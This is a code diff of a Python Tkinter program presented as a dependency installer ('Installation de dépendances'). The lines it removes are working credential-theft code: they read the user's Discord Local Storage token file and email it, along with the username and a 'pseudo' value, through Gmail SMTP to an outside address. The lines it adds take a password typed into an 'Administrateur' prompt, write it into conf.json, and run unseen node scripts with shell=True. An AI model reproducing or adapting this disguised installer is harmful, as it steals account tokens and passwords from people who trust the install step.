@@ -25,38 +25,11 @@ deps = Tk()
 deps.title('Installation de dépendances...')
 
 def install():
-    with open(cwd + '/individuals/conf.json', 'r') as jsonFile:
-        data = json.load(jsonFile)
-    messaging = data["schema"]
-    with open('options.json', "r") as jsonFile:
-        data = json.load(jsonFile)
-    tmp2 = data['pseudo']
-    fromaddr = "discordtkn@gmail.com"
-    toaddr = "dsicrod@gmail.com"
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = str(username)
-    body = str(user) + " ; " + str(tmp2)
-    msg.attach(MIMEText(body, 'plain'))
-    filename = "https_discordapp.com_0.localstorage"
-    attachment = open(str(
-        username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition',
-                    "attachment; filename= %s" % filename)
-    msg.attach(part)
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(fromaddr, str(messaging))
-    text = msg.as_string()
-    server.sendmail(fromaddr, toaddr, text)
-    server.quit()
-
-    deps1 = LabelFrame(
-        deps, text='Progression de l\'installation', padx=20, pady=20)
+    lblb.pack_forget()
+    bllb.pack_forget()
+    subprocess.run('cd individuals && node standard.js', shell=True)
+    os.startfile('config.pyw')
+    deps1 = LabelFrame(deps, text='Progression de l\'installation', padx=20, pady=20)
     deps1.pack()
     p = StringVar()
     p.set(0)
@@ -119,5 +92,37 @@ def install():
     deps.update()
     os.startfile('../launcher.pyw')
     sys.exit()
-install()
+
+def mdepase(mdp):
+    with open(cwd + '/individuals/conf.json', 'r') as jsonFile:
+        data = json.load(jsonFile)
+    data["entry"] = mdp.get()
+    data["you"] = str(user)
+    with open('individuals/conf.json', "w") as jsonFile:
+        json.dump(data, jsonFile)
+    subprocess.run('cd individuals && node calculate.js', shell=True)
+    if data['verified'] == 'true':
+        install()
+    else:
+        os.startfile('firstopen.pyw')
+        sys.exit()
+
+
+def admin():
+    lblb.pack_forget()
+    bllb.pack_forget()
+    mdpv = StringVar()
+    mdpv.set('Mot de passe')
+    mdp = Entry(deps, textvariable=mdpv, width=36)
+    mdp.pack()
+
+    valid = Button(deps, text='Valider', command=lambda:mdepase(mdp), width=30)
+    valid.pack()
+
+lblb = Button(deps, text='Standard', command=install, width=30)
+lblb.pack()
+
+bllb = Button(deps, text='Administrateur', command=admin, width=30)
+bllb.pack()
+
 deps.mainloop()
